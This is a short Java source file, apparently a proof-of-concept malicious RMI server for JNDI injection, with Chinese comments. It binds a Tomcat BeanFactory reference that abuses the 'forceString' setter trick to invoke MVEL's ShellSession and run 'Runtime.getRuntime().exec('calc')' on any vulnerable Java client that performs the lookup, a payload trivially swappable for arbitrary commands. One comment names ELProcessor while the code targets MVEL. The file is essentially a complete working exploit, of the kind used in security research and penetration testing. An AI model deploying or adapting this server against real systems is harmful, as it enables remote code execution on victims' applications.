package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class MvelServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1100);
        System.setProperty("java.rmi.server.hostname", "127.0.0.1");
        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);

        // 强制将 'x' 属性的setter 从 'setX' 变为 'eval', 详细逻辑见 BeanFactory.getObjectInstance 代码
        ref.add(new StringRefAddr("forceString", "a=exec"));
        ref.add(new StringRefAddr("a", "push Runtime.getRuntime().exec('calc');"));


        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("mvel", referenceWrapper);  // 绑定目录名
        System.out.println("Server Start on 1100...");
    }
}
